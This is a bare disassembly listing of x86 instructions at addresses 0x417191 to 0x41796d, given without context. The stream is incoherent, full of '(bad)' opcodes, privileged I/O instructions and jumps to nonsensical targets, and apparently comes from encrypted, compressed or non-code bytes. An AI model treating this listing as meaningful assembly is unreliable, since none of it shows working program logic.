  417191:	cmp    dh,BYTE PTR [edx+0x54]
  417194:	mov    ds:0x78a2a38b,eax
  417199:	popa   
  41719a:	repnz jecxz 0x4171df
  41719d:	or     al,0x90
  41719f:	call   0x8cdbb4bd
  4171a4:	in     al,dx
  4171a5:	mov    DWORD PTR [ecx+ebp*1+0x7167b8fb],ecx
  4171ac:	call   0xed0b2e15
  4171b1:	int3   
  4171b2:	or     dh,BYTE PTR ds:0xd1016681
  4171b8:	jb     0x41714e
  4171ba:	sbb    DWORD PTR [eax],edi
  4171bc:	scas   eax,DWORD PTR es:[edi]
  4171bd:	xor    DWORD PTR [edi],esi
  4171bf:	mov    bh,0xd6
  4171c1:	push   0xffffff91
  4171c3:	repz sbb dh,bh
  4171c6:	mov    BYTE PTR [ecx],bl
  4171c8:	inc    edi
  4171c9:	pop    ebp
  4171ca:	ror    DWORD PTR [ebx-0x29],cl
  4171cd:	cmc    
  4171ce:	rcr    DWORD PTR [eax+esi*8],0x9a
  4171d2:	add    al,0xc2
  4171d4:	dec    ebx
  4171d5:	ja     0x417255
  4171d7:	and    ecx,edi
  4171d9:	adc    eax,0xcf31b849
  4171de:	ins    DWORD PTR es:[edi],dx
  4171df:	push   esi
  4171e0:	out    0x5b,al
  4171e2:	es pop esi
  4171e4:	in     eax,dx
  4171e5:	(bad)  
  4171e6:	lods   al,BYTE PTR ds:[esi]
  4171e7:	pop    ebp
  4171e8:	test   BYTE PTR [ecx+0x2a768d1b],ah
  4171ee:	lds    esp,FWORD PTR [edi]
  4171f0:	test   BYTE PTR [eax+0x1a],dl
  4171f3:	repz mov ecx,0x43ba8b0d
  4171f9:	push   esp
  4171fa:	inc    eax
  4171fb:	pop    eax
  4171fc:	push   ecx
  4171fd:	cmp    edx,ecx
  4171ff:	sahf   
  417200:	fwait
  417201:	add    cl,BYTE PTR [edi]
  417203:	or     al,0xbf
  417205:	je     0x417205
  417207:	ds xchg edx,eax
  417209:	or     eax,0xbd0a4bf4
  41720e:	cmp    DWORD PTR ds:0x9c6dfee8,ebp
  417214:	mov    ecx,0xec84dcc2
  417219:	dec    edx
  41721a:	test   al,0x21
  41721c:	mov    esi,0x424e555e
  417221:	cmp    BYTE PTR [edx],0x95
  417224:	xor    DWORD PTR [esi+0x4b2d727b],edx
  41722a:	and    ecx,edx
  41722c:	sar    eax,0x36
  41722f:	stos   DWORD PTR es:[edi],eax
  417230:	(bad)  
  417232:	mov    ch,0x9a
  417234:	and    DWORD PTR [eax+0x6fe08976],0x4ebca0b
  41723e:	daa    
  41723f:	ret    0xb737
  417242:	inc    ebp
  417243:	int    0x2b
  417245:	adc    al,0xc8
  417247:	je     0x417255
  417249:	sub    BYTE PTR [ecx+0x23],0xca
  41724d:	cld    
  41724e:	leave  
  41724f:	pop    ebp
  417250:	fdiv   DWORD PTR [ebx]
  417252:	ds pop ebp
  417254:	jns    0x41729c
  417256:	mov    dh,0x1
  417258:	call   0x502d:0x19a85233
  41725f:	in     al,0xbf
  417261:	sbb    BYTE PTR [edx+0x64946ce1],dl
  417267:	rcl    BYTE PTR [eax],cl
  417269:	xchg   dh,dl
  41726b:	mov    esi,0x5d9e652c
  417270:	dec    eax
  417271:	int    0xe4
  417273:	add    bl,bl
  417275:	cmp    bh,BYTE PTR [ebp+0x29]
  417278:	cmp    edx,0xf0967deb
  41727e:	outs   dx,DWORD PTR ds:[esi]
  41727f:	sub    cl,ch
  417281:	adc    dh,BYTE PTR ds:[esp+esi*4-0x2fe9d3f0]
  417289:	adc    al,0xf4
  41728b:	xor    al,0x4e
  41728d:	shl    DWORD PTR ds:0x11e13f39,0xab
  417294:	nop
  417295:	jmp    0x417315
  417297:	adc    eax,0xc8e0393d
  41729c:	adc    al,0x5b
  41729e:	mov    ebp,0x93d290fc
  4172a3:	push   0xce7cb014
  4172a8:	je     0x41724b
  4172aa:	sahf   
  4172ab:	mov    esp,0x1f2b44b
  4172b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172b1:	test   al,0x2d
  4172b3:	aad    0xdc
  4172b5:	popa   
  4172b6:	sbb    BYTE PTR [ebp+0x56cff543],bl
  4172bc:	mov    edx,0x39e0f89f
  4172c1:	icebp  
  4172c2:	in     al,dx
  4172c3:	jno    0x4172e4
  4172c5:	inc    ebp
  4172c6:	fst    st(4)
  4172c8:	adc    al,0x55
  4172ca:	retf   0xadb0
  4172cd:	mov    ebx,0x3522ac0
  4172d2:	in     eax,0xd8
  4172d4:	das    
  4172d5:	mov    ss,edi
  4172d7:	mov    ch,0xc7
  4172d9:	and    al,0xa8
  4172db:	push   edx
  4172dc:	popf   
  4172dd:	pop    edx
  4172de:	lods   eax,DWORD PTR ds:[esi]
  4172df:	sbb    edx,DWORD PTR [ecx]
  4172e1:	jg     0x41727f
  4172e3:	mov    ds:0x1f642c9,ax
  4172e9:	int3   
  4172ea:	dec    esi
  4172eb:	sub    DWORD PTR [ecx],ebx
  4172ed:	or     ch,BYTE PTR [eax+0x4d343cf4]
  4172f3:	imul   eax,DWORD PTR [eax+esi*2+0x32],0xffffffb7
  4172f8:	int    0x54
  4172fa:	xchg   esp,eax
  4172fb:	hlt    
  4172fc:	or     eax,edx
  4172fe:	pop    ebx
  4172ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417300:	push   ds
  417301:	outs   dx,BYTE PTR ds:[esi]
  417302:	dec    ecx
  417303:	push   ebp
  417304:	ffree  st(7)
  417306:	fidiv  WORD PTR [ebp+ebx*4-0x1]
  41730a:	movq   mm0,QWORD PTR [esi+esi*2]
  41730e:	loopne 0x4172bb
  417310:	and    al,0x22
  417312:	or     DWORD PTR [edx+0x74d8752e],ebx
  417318:	std    
  417319:	sub    BYTE PTR [ebp-0x34],0xa8
  41731d:	pop    esi
  41731e:	jbe    0x417319
  417320:	(bad)  
  417321:	fs cwde 
  417323:	hlt    
  417324:	inc    edi
  417325:	sub    ah,BYTE PTR [ecx]
  417327:	out    0x17,eax
  417329:	mov    ecx,eax
  41732b:	lea    edi,[edi-0x42ddc94a]
  417331:	rol    BYTE PTR [esi-0x14],0x32
  417335:	(bad)
  417338:	pop    esi
  417339:	mov    al,ds:0x115ba43d
  41733e:	mov    edi,0x4f032ae4
  417343:	mov    esp,0x75b62215
  417348:	dec    esp
  417349:	cmc    
  41734a:	inc    esp
  41734b:	sahf   
  41734c:	or     DWORD PTR [ebx+0x6fff0b29],0x276d440b
  417356:	or     edi,DWORD PTR [esi]
  417358:	ja     0x4173a8
  41735a:	inc    ebp
  41735b:	lahf   
  41735c:	scas   al,BYTE PTR es:[edi]
  41735d:	mov    edi,0x5f138a8d
  417362:	inc    ebx
  417363:	(bad)  
  417364:	out    0x50,al
  417366:	sbb    al,0x26
  417368:	(bad)  
  417369:	pop    ebp
  41736a:	aas    
  41736b:	jle    0x417354
  41736d:	sub    eax,0x3689e41e
  417372:	pop    ebx
  417373:	stos   DWORD PTR es:[edi],eax
  417374:	int3   
  417375:	sub    al,0xc4
  417378:	je     0x4173de
  41737a:	ds push ebp
  41737c:	sbb    esp,DWORD PTR [esi+edx*8]
  41737f:	add    DWORD PTR [edi+0x55],0xffffffed
  417383:	dec    edx
  417384:	mov    BYTE PTR [eax],cl
  417386:	xchg   ecx,eax
  417387:	inc    ecx
  417388:	xor    eax,0x5567195a
  41738d:	xchg   esp,eax
  41738e:	mov    esi,0x85790cfe
  417393:	jnp    0x417407
  417395:	adc    BYTE PTR [ebx-0x6],dh
  417398:	xor    ecx,DWORD PTR [ebx-0x39]
  41739b:	mul    DWORD PTR [esi+ebp*8+0x7c]
  41739f:	ds push 0x9
  4173a2:	daa    
  4173a3:	push   cs
  4173a4:	(bad)  
  4173a5:	push   esi
  4173a6:	imul   edx,ebp,0xffffffe4
  4173a9:	adc    al,0xbb
  4173ab:	and    eax,0xea3300a3
  4173b0:	mov    ebp,0x904c6142
  4173b5:	aam    0x2c
  4173b7:	retf   
  4173b8:	xlat   BYTE PTR ds:[ebx]
  4173b9:	xor    eax,0x19e8873
  4173be:	in     ax,0x36
  4173c1:	ja     0x417416
  4173c3:	jne    0x417377
  4173c5:	arpl   WORD PTR [edx],sp
  4173c7:	mov    dh,0x4b
  4173c9:	out    dx,al
  4173ca:	cmc    
  4173cb:	sti    
  4173cc:	add    al,0x6f
  4173ce:	into   
  4173cf:	daa    
  4173d0:	sub    eax,0x9ab1bc0b
  4173d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173d6:	jnp    0x417364
  4173d8:	out    0x39,eax
  4173da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173db:	sub    BYTE PTR ds:0x2f74b9b7,ah
  4173e1:	in     eax,0x1e
  4173e3:	stos   BYTE PTR es:[edi],al
  4173e4:	jne    0x417375
  4173e6:	lods   al,BYTE PTR ds:[esi]
  4173e7:	push   ss
  4173e8:	(bad)  
  4173e9:	jle    0x417440
  4173eb:	fistp  DWORD PTR [edi+0x2c655fc5]
  4173f1:	inc    ebx
  4173f2:	mov    eax,0x4a1c0c51
  4173f7:	(bad)  
  4173f8:	cld    
  4173f9:	pusha  
  4173fa:	adc    BYTE PTR [eax],0xb6
  4173fd:	lods   al,BYTE PTR ds:[esi]
  4173fe:	loop   0x4173b1
  417400:	pop    ecx
  417401:	push   es
  417402:	push   cs
  417403:	retf   
  417404:	jne    0x41738e
  417406:	cmp    BYTE PTR [ecx],ah
  417408:	jp     0x417415
  41740a:	ins    BYTE PTR es:[edi],dx
  41740b:	stc    
  41740c:	mov    ?,ebx
  41740e:	cmp    al,0xa
  417410:	arpl   bp,cx
  417412:	sbb    eax,0x5820419a
  417417:	cwde   
  417418:	jns    0x4173b7
  41741a:	dec    esi
  41741b:	and    eax,0xdf3984d2
  417420:	gs jmp 0x7ef7:0xd2ddd7ea
  417428:	cdq    
  417429:	and    al,0x96
  41742b:	push   esp
  41742c:	sub    DWORD PTR [eax-0x47d7ea84],esp
  417432:	inc    BYTE PTR [ebx-0x77]
  417435:	push   edi
  417436:	cmp    DWORD PTR [esi],edx
  417438:	pop    ss
  417439:	stos   BYTE PTR es:[edi],al
  41743a:	mov    es,WORD PTR [edx-0x19e1beca]
  417440:	in     al,dx
  417441:	push   ss
  417442:	xchg   esp,eax
  417443:	leave  
  417444:	dec    edi
  417445:	mov    ebp,DWORD PTR [edi+0x8]
  417448:	add    DWORD PTR [ecx+ebp*4],0x2f
  41744c:	ins    BYTE PTR es:[edi],dx
  41744d:	fwait
  41744e:	lahf   
  41744f:	mov    eax,ds:0x49b76fb6
  417454:	call   0x69e0:0x704a375c
  41745b:	push   eax
  41745c:	inc    edx
  41745d:	push   eax
  41745e:	fiadd  DWORD PTR [edx+0x27e68136]
  417464:	mov    edx,0xe4f065b4
  417469:	sub    eax,0x526903bf
  41746e:	(bad)  
  41746f:	stos   DWORD PTR es:[edi],eax
  417470:	in     al,0x9
  417472:	adc    al,0x67
  417474:	mov    ds:0x66460035,eax
  417479:	sub    esi,edi
  41747b:	imul   ecx,DWORD PTR ds:[ecx+0x4d],0x9
  417480:	inc    ebp
  417481:	test   al,0x9a
  417483:	in     al,0xf3
  417485:	ffreep st(1)
  417487:	jge    0x41744d
  417489:	push   ecx
  41748a:	int3   
  41748b:	in     eax,dx
  41748c:	shr    BYTE PTR [edx+0x69],cl
  41748f:	sub    BYTE PTR [edx+edx*8+0x51b70428],al
  417496:	push   cs
  417497:	jnp    0x41743e
  417499:	int    0xdf
  41749b:	mov    eax,0xbad4265
  4174a0:	adc    ebp,edi
  4174a2:	dec    ebx
  4174a3:	push   ecx
  4174a4:	mov    cl,BYTE PTR [ecx]
  4174a6:	das    
  4174a7:	add    BYTE PTR [edi+edx*8-0x145fa6d],ch
  4174ae:	add    bh,ch
  4174b0:	adc    al,0xc4
  4174b2:	add    BYTE PTR [ecx+edi*2+0x3a],cl
  4174b6:	sub    eax,0xbdc7de8d
  4174bb:	cmp    DWORD PTR [esi],edx
  4174bd:	sbb    ch,bl
  4174bf:	jl     0x417477
  4174c1:	in     al,dx
  4174c2:	stos   BYTE PTR es:[edi],al
  4174c3:	mov    bl,BYTE PTR [ecx+0x52]
  4174c6:	es inc ecx
  4174c8:	jge    0x4174e9
  4174ca:	mov    al,ds:0xc2387805
  4174cf:	retf   
  4174d0:	adc    BYTE PTR [ecx-0x3721d48f],0x9c
  4174d7:	pop    esp
  4174d8:	(bad)
  4174dc:	inc    ecx
  4174dd:	dec    esp
  4174de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174df:	dec    edi
  4174e0:	xor    al,0xb8
  4174e2:	dec    esp
  4174e3:	xchg   ebx,eax
  4174e4:	add    DWORD PTR [ebp+0x30],esi
  4174e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174e8:	inc    edx
  4174e9:	int3   
  4174ea:	mov    BYTE PTR [ecx+0x2fc034aa],bh
  4174f0:	cli    
  4174f1:	jne    0x4174a6
  4174f3:	sbb    eax,0xecbc3fe7
  4174f8:	int3   
  4174f9:	push   cs
  4174fa:	fisttp DWORD PTR [ebp+0x32]
  4174fd:	shr    ebp,1
  4174ff:	push   ss
  417500:	mov    ds:0xdf1a4b8e,eax
  417505:	inc    edi
  417506:	ins    BYTE PTR es:[edi],dx
  417507:	sbb    ah,BYTE PTR [edx-0x76]
  41750a:	xor    eax,0xc7811b18
  41750f:	xchg   DWORD PTR [eax+0x22],ecx
  417512:	or     BYTE PTR [ebx+0x18],al
  417515:	pop    ecx
  417516:	mov    cl,0x25
  417518:	fwait
  417519:	cmp    DWORD PTR [ecx+0x42bc7f87],ebp
  41751f:	popf   
  417520:	push   ebx
  417521:	sub    BYTE PTR [ecx-0x6128c2d7],ah
  417527:	retf   0x3fa0
  41752a:	adc    al,0x4d
  41752c:	ins    DWORD PTR es:[edi],dx
  41752d:	dec    esi
  41752e:	int3   
  41752f:	jmp    0xeb2b76d
  417534:	fistp  DWORD PTR fs:[ecx]
  417537:	mov    eax,0x507a78d8
  41753c:	ins    BYTE PTR es:[edi],dx
  41753d:	xchg   ebx,eax
  41753e:	add    ah,BYTE PTR [ebx]
  417540:	push   cs
  417541:	(bad)  
  417543:	in     eax,dx
  417544:	jo     0x41757a
  417546:	loop   0x417550
  417548:	or     DWORD PTR [eax],ecx
  41754a:	dec    edx
  41754b:	aam    0xb3
  41754d:	mov    BYTE PTR [edx+0x25],ah
  417550:	fadd   st(0),st
  417552:	sub    dl,BYTE PTR [ecx+0xcec6f51]
  417558:	mov    edi,0x55b2d9d3
  41755d:	mov    ah,BYTE PTR [esi+0xf7]
  417563:	add    BYTE PTR [eax],al
  417565:	add    al,ch
  417567:	shl    BYTE PTR [edi+0x76],1
  41756a:	jg     0x417563
  41756c:	stc    
  41756d:	ficom  WORD PTR [ebp+0x2e]
  417570:	inc    esp
  417571:	and    al,0xc8
  417573:	cmp    dh,al
  417575:	fsubr  QWORD PTR [ecx]
  417577:	jo     0x41757a
  417579:	add    BYTE PTR [edx],ah
  41757b:	pop    es
  41757c:	add    BYTE PTR [eax],al
  41757e:	cs jmp 0x417585
  417581:	cmp    BYTE PTR ds:0x7293d623,bl
  417587:	inc    ebp
  417588:	mov    dh,cl
  41758a:	(bad)  
  41758b:	int    0x3
  41758d:	mov    bh,0x45
  41758f:	jg     0x417547
  417591:	add    eax,0xe5a49e5d
  417596:	or     DWORD PTR [eax-0x5d],ecx
  417599:	jp     0x417587
  41759b:	mov    dl,0x32
  41759d:	push   esi
  41759e:	imul   eax,DWORD PTR [esi-0x1a],0xb5e41817
  4175a5:	stos   DWORD PTR es:[edi],eax
  4175a6:	or     al,0xc8
  4175a8:	push   eax
  4175a9:	mov    cl,0x8f
  4175ab:	fs xor al,0xb1
  4175ae:	sub    DWORD PTR [eax*8-0x6b6a077c],0xffffffd7
  4175b6:	call   0x29f7:0xa681e33f
  4175bd:	jecxz  0x41757f
  4175bf:	add    dl,BYTE PTR [ecx]
  4175c1:	imul   edx,DWORD PTR [ebx+0x654022ec],0x4b
  4175c8:	bound  esi,QWORD PTR ds:0x6e84cdba
  4175ce:	test   DWORD PTR [esi],0x3bdde1ae
  4175d4:	and    eax,esi
  4175d6:	call   0x452e1d27
  4175db:	es inc ecx
  4175dd:	out    0xfd,al
  4175df:	sub    ebp,DWORD PTR [edx]
  4175e1:	xchg   BYTE PTR [edi],bh
  4175e3:	jmp    0x41756e
  4175e5:	and    dl,BYTE PTR [eax+0x67140a0f]
  4175eb:	mov    ch,BYTE PTR [edx+0xe65d3fb]
  4175f1:	fs mov cl,0x68
  4175f4:	pop    ebp
  4175f5:	and    al,0xf7
  4175f7:	aaa    
  4175f8:	ret    
  4175f9:	retf   
  4175fa:	cmp    DWORD PTR [ebx+ecx*8-0x32bf746c],0xffffff87
  417602:	xchg   ebp,eax
  417603:	aam    0x7d
  417605:	imul   edi,eax,0x3e57a1bb
  41760b:	test   DWORD PTR [ebx+0x34],0x4b1a83de
  417612:	lods   al,BYTE PTR cs:[esi]
  417614:	pop    ebx
  417615:	xor    DWORD PTR [edx],eax
  417617:	pop    ebx
  417618:	xchg   ebx,eax
  417619:	cmp    eax,0x4f5cfa11
  41761e:	or     eax,0x57ec5b87
  417623:	inc    edx
  417624:	sub    DWORD PTR [eax],0x46
  417627:	sub    dl,BYTE PTR [eax]
  417629:	inc    edi
  41762a:	or     eax,ebx
  41762c:	jge    0x4175df
  41762e:	push   edx
  41762f:	lods   eax,DWORD PTR ds:[esi]
  417630:	fs xchg esi,eax
  417632:	fst    DWORD PTR [eax-0x42]
  417635:	leave  
  417636:	and    ch,BYTE PTR [ebp+0x1be4ccfc]
  41763c:	rcl    ecx,0x4f
  41763f:	aaa    
  417640:	sti    
  417641:	inc    ebx
  417642:	pusha  
  417643:	cmp    al,0x77
  417645:	shl    BYTE PTR [ecx-0xc554960],0x3c
  41764c:	and    ah,dh
  41764e:	ror    BYTE PTR ds:0x12d45137,1
  417654:	push   edx
  417655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417656:	out    0xbe,eax
  417658:	jbe    0x417627
  41765a:	cmp    eax,0xe2e18c8b
  41765f:	sbb    BYTE PTR [edx],bh
  417661:	xlat   BYTE PTR ds:[ebx]
  417662:	xchg   ecx,eax
  417663:	cmp    BYTE PTR [eax],0x89
  417666:	xchg   edi,eax
  417667:	fistp  DWORD PTR [ebp+0x660223b]
  41766d:	dec    BYTE PTR [edx+0x24c2a308]
  417673:	int    0x60
  417675:	inc    edx
  417676:	dec    edi
  417677:	sbb    esi,DWORD PTR [ebp-0x4ff8fa9d]
  41767d:	cmp    al,0x36
  41767f:	dec    ebx
  417680:	sete   BYTE PTR [eax-0x4a]
  417684:	ret    
  417685:	inc    edi
  417686:	pop    ecx
  417687:	scas   al,BYTE PTR es:[edi]
  417688:	dec    esp
  417689:	outs   dx,BYTE PTR ds:[esi]
  41768a:	ror    DWORD PTR [eax+0x2f],0xd4
  41768e:	out    dx,eax
  41768f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417690:	pop    ebx
  417691:	(bad)  
  417693:	repz enter 0xdaa9,0x77
  417698:	jle    0x417632
  41769a:	in     al,0x69
  41769c:	xlat   BYTE PTR ds:[ebx]
  41769d:	xchg   edx,eax
  41769e:	clc    
  41769f:	leave  
  4176a0:	pop    ds
  4176a1:	xor    al,0x6d
  4176a3:	sbb    BYTE PTR [ebx+0x1160f978],cl
  4176a9:	fs inc ebx
  4176ab:	gs enter 0x388c,0x75
  4176b0:	pop    es
  4176b1:	mov    bh,0x5e
  4176b3:	test   esp,ebx
  4176b5:	icebp  
  4176b6:	(bad)  
  4176b8:	lahf   
  4176b9:	shl    DWORD PTR [ebp+0x73d6747c],0x96
  4176c0:	xor    ch,BYTE PTR [eax]
  4176c2:	js     0x417714
  4176c4:	rcl    BYTE PTR [edi-0x68],cl
  4176c7:	dec    edx
  4176c8:	jne    0x417737
  4176ca:	test   al,0x67
  4176cc:	xlat   BYTE PTR ds:[ebx]
  4176cd:	hlt    
  4176ce:	dec    ebx
  4176cf:	clc    
  4176d0:	or     eax,0x88bdae4a
  4176d5:	test   eax,0x55806cb
  4176da:	cwde   
  4176db:	dec    eax
  4176dc:	and    BYTE PTR [eax+0x4e],dl
  4176df:	pushf  
  4176e0:	or     eax,0x8d3a72bb
  4176e5:	adc    eax,0xd10ae5f
  4176ea:	pop    eax
  4176eb:	jae    0x41771d
  4176ed:	sub    BYTE PTR [ecx+edi*4],ah
  4176f0:	xor    DWORD PTR [ecx+0xd],edi
  4176f3:	and    DWORD PTR [eax],edi
  4176f5:	add    ah,BYTE PTR [edi]
  4176f7:	sbb    al,BYTE PTR [ecx-0x29]
  4176fa:	dec    edi
  4176fb:	mov    al,ds:0x750e9d40
  417700:	jecxz  0x4176e6
  417702:	cld    
  417703:	add    BYTE PTR [ecx+0x74d5005b],0x91
  41770a:	out    dx,eax
  41770b:	xor    al,0x6d
  41770d:	mov    ecx,0x6a1f9c89
  417712:	pusha  
  417713:	pop    ss
  417714:	xor    BYTE PTR [ecx],cl
  417716:	ret    0xacc
  417719:	mov    esp,DWORD PTR [ebx+esi*1]
  41771c:	xor    eax,0xcaf156ae
  417721:	mov    al,ds:0x1595fc4f
  417726:	mov    DWORD PTR [eax],esp
  417728:	and    DWORD PTR [ebx-0x6fdb7d30],edx
  41772e:	mov    edi,0xdf42f766
  417733:	jp     0x417790
  417735:	xchg   BYTE PTR [edi+ecx*8],dl
  417738:	cmp    esi,eax
  41773a:	loope  0x4176f4
  41773c:	in     eax,dx
  41773d:	push   ds
  41773e:	pop    es
  41773f:	add    dl,ch
  417741:	test   eax,0xd130e9e9
  417746:	int    0xaf
  417748:	lahf   
  417749:	in     al,0x39
  41774b:	push   esi
  41774c:	cwde   
  41774d:	adc    dh,BYTE PTR [edi+0x19]
  417750:	jno    0x417705
  417752:	out    dx,al
  417753:	ret    0xaf35
  417756:	mov    bh,0x6
  417758:	and    eax,0x59f5c11e
  41775d:	xchg   esi,ebx
  41775f:	inc    esi
  417760:	cli    
  417761:	repz xchg edi,eax
  417763:	fmul   QWORD PTR [ebx-0x7e]
  417766:	mov    esi,0x6fcc1348
  41776b:	mov    ebp,DWORD PTR [edi-0x63]
  41776e:	fld    st(6)
  417770:	bound  esi,QWORD PTR [ebp+0x42c87f5a]
  417776:	cmovb  edx,DWORD PTR [esi+eax*2-0x5a]
  41777b:	xor    edi,esi
  41777d:	or     ch,BYTE PTR [esi]
  41777f:	and    al,0x7b
  417781:	add    edx,DWORD PTR [ebx]
  417783:	xor    al,0xef
  417785:	push   edx
  417786:	popf   
  417787:	pop    ecx
  417789:	xchg   esp,eax
  41778a:	mov    eax,ds:0xcbcb23ab
  41778f:	dec    edi
  417790:	mov    ebp,ebp
  417792:	sub    esi,0x29
  417795:	mov    edi,0x8a8a56ff
  41779a:	xchg   esp,eax
  41779b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41779c:	xchg   DWORD PTR [eax-0x2ac14349],edx
  4177a2:	fs sti 
  4177a4:	fwait
  4177a5:	push   0xfffffff0
  4177a7:	(bad)
  4177aa:	(bad)  
  4177ab:	jmp    0x417823
  4177ad:	pop    es
  4177ae:	or     eax,DWORD PTR [edi-0x2abb8c7d]
  4177b4:	cmp    dl,bh
  4177b6:	cs out dx,al
  4177b8:	mov    WORD PTR [ecx-0x9011c55],es
  4177be:	mov    cl,0xbd
  4177c0:	es out 0xf0,eax
  4177c3:	cmp    BYTE PTR [eax],cl
  4177c5:	xchg   esp,eax
  4177c6:	mov    esp,0x85ba4d49
  4177cb:	sub    DWORD PTR [edx+0x20],ebp
  4177ce:	nop
  4177cf:	in     eax,dx
  4177d0:	push   edi
  4177d1:	adc    eax,0x5d74c3e2
  4177d6:	mov    eax,0xe6a2c6bb
  4177db:	lahf   
  4177dc:	dec    edi
  4177dd:	sahf   
  4177de:	sub    eax,0xc31e32c8
  4177e3:	pop    esp
  4177e4:	sbb    al,0xf8
  4177e6:	sub    bl,BYTE PTR [ebx-0x2872ee0d]
  4177ec:	outs   dx,DWORD PTR ds:[esi]
  4177ed:	jmp    0x41781b
  4177ef:	outs   dx,DWORD PTR ds:[esi]
  4177f0:	xlat   BYTE PTR ds:[ebx]
  4177f1:	fild   WORD PTR [ebx+0x7b75c8f9]
  4177f7:	js     0x41786a
  4177f9:	int3   
  4177fa:	call   0xd4df:0xaa794cc6
  417801:	out    dx,eax
  417802:	or     DWORD PTR [eax],ebx
  417804:	pop    edx
  417805:	out    0xc6,al
  417807:	xchg   cx,ax
  417809:	sbb    BYTE PTR [edi-0x6],cl
  41780c:	push   ecx
  41780d:	retf   0xe7d9
  417810:	bound  edx,QWORD PTR [edi-0x7a]
  417813:	dec    eax
  417814:	sub    al,0x27
  417816:	nop
  417817:	rol    BYTE PTR [edi+eiz*1],cl
  41781a:	loop   0x417824
  41781c:	add    eax,0x746b0a2e
  417821:	mov    al,0xe5
  417823:	arpl   WORD PTR [esi-0x1d41f0e3],di
  417829:	imul   eax,DWORD PTR [edx-0x49],0x78bac0fb
  417830:	add    ch,ch
  417832:	pop    ss
  417833:	inc    esi
  417834:	add    al,0xb9
  417836:	hlt    
  417837:	mov    ch,0xd8
  417839:	ret    0x7751
  41783c:	aas    
  41783d:	add    bh,BYTE PTR [ebp+0x71]
  417840:	cmp    al,0xc5
  417842:	and    BYTE PTR [edi-0xe],bh
  417845:	add    DWORD PTR gs:[ecx+ebx*4+0x7b3f7279],esi
  41784d:	and    BYTE PTR [eax],ah
  41784f:	into   
  417850:	aas    
  417851:	xchg   edi,eax
  417852:	add    bh,BYTE PTR [ebx+0x1f]
  417855:	test   al,0xf6
  417857:	or     edi,DWORD PTR [bx+si]
  41785a:	nop
  41785b:	push   edx
  41785c:	mov    ecx,0x929eaa2d
  417861:	lods   eax,DWORD PTR ds:[esi]
  417862:	jmp    0x417885
  417864:	sub    eax,0x3343915
  417869:	js     0x417801
  41786b:	in     eax,0xf6
  41786d:	mov    esp,0x562ef2d9
  417872:	or     DWORD PTR [eax+0x3f],eax
  417875:	(bad)  
  417876:	dec    esp
  417877:	idiv   BYTE PTR [ecx+ecx*1+0x108a8c9]
  41787e:	fdivrp st(2),st
  417880:	sbb    eax,0x57cc550d
  417885:	adc    eax,0x8424ef04
  41788a:	iret   
  41788b:	mov    es,WORD PTR [edi+0x1f5564e]
  417891:	clc    
  417892:	imul   edx,DWORD PTR [edi+0x17771f78],0x68202545
  41789c:	bound  edx,QWORD PTR [eax]
  41789e:	dec    ebx
  41789f:	add    eax,0xa90659e2
  4178a4:	mov    dl,0xb3
  4178a6:	ins    BYTE PTR es:[edi],dx
  4178a7:	pop    ecx
  4178a8:	or     edi,eax
  4178aa:	jecxz  0x41784a
  4178ac:	aas    
  4178ad:	xchg   ecx,eax
  4178ae:	stos   BYTE PTR es:[edi],al
  4178af:	mov    al,0x88
  4178b1:	call   FWORD PTR [esi-0x43]
  4178b4:	mov    esi,0x81b23ff6
  4178b9:	ret    
  4178ba:	stos   DWORD PTR es:[edi],eax
  4178bb:	push   edi
  4178bc:	sahf   
  4178bd:	jne    0x417851
  4178bf:	call   0xded8d41d
  4178c4:	mov    WORD PTR [eax-0x15],?
  4178c7:	call   0xe3d6faaf
  4178cc:	fdiv   st,st(4)
  4178ce:	xchg   esi,eax
  4178cf:	push   edx
  4178d0:	pop    ebp
  4178d1:	push   edx
  4178d2:	sbb    eax,0xc0486c3
  4178d7:	outs   dx,DWORD PTR ds:[esi]
  4178d8:	lods   eax,DWORD PTR ds:[esi]
  4178d9:	(bad)  
  4178db:	sbb    al,0xf0
  4178dd:	xchg   ebx,eax
  4178de:	pushf  
  4178df:	add    DWORD PTR [ebp+ecx*1+0x1b4ee56f],esp
  4178e6:	imul   ebp,DWORD PTR es:[ebx+eax*4-0x2e],0xa638ca98
  4178ef:	pop    ebp
  4178f0:	ret    
  4178f1:	stos   BYTE PTR es:[edi],al
  4178f2:	call   0x816a:0x778a789d
  4178f9:	sbb    ch,BYTE PTR ds:0x7642f074
  4178ff:	lods   eax,DWORD PTR ds:[esi]
  417900:	jge    0x4178be
  417902:	jno    0x4178e7
  417904:	jl     0x4178f5
  417906:	pop    ss
  417907:	les    ecx,FWORD PTR [ebp+0x6e11dd85]
  41790d:	scas   al,BYTE PTR es:[edi]
  41790e:	shl    BYTE PTR [ebx-0x63],0x5e
  417912:	sub    cl,dh
  417914:	stc    
  417915:	test   al,0x16
  417917:	mov    ecx,0x4efeb425
  41791c:	cmp    DWORD PTR [ebx-0x5ce2a0ad],0x5af78e75
  417926:	dec    ebx
  417927:	jle    0x417921
  417929:	mov    edx,DWORD PTR [ecx+edi*1]
  41792c:	mov    ebp,0xe17e6a72
  417931:	stc    
  417932:	adc    al,0x97
  417934:	(bad)  
  417935:	fidivr DWORD PTR [edi]
  417937:	aad    0xa8
  417939:	nop    ecx
  41793c:	iret   
  41793d:	dec    esp
  41793e:	fild   WORD PTR [ebp+0x6f]
  417941:	add    eax,DWORD PTR [eax+0x73]
  417944:	stc    
  417945:	ret    
  417946:	mov    WORD PTR [ebx],gs
  417948:	mov    dl,0x3e
  41794a:	loop   0x4179aa
  41794c:	sbb    al,0x56
  41794e:	jmp    0x41792d
  417950:	add    ah,BYTE PTR [ecx+0x49d553a3]
  417956:	daa    
  417957:	mov    ecx,0xadb3b560
  41795c:	sar    DWORD PTR [eax+0x40ad9d61],1
  417962:	test   BYTE PTR [ecx],ch
  417964:	inc    edi
  417965:	dec    ebx
  417966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417967:	inc    ebx
  417968:	or     DWORD PTR [edx+edx*1],edi
  41796b:	pusha  
  41796c:	dec    eax
  41796d:	test   dl,ah
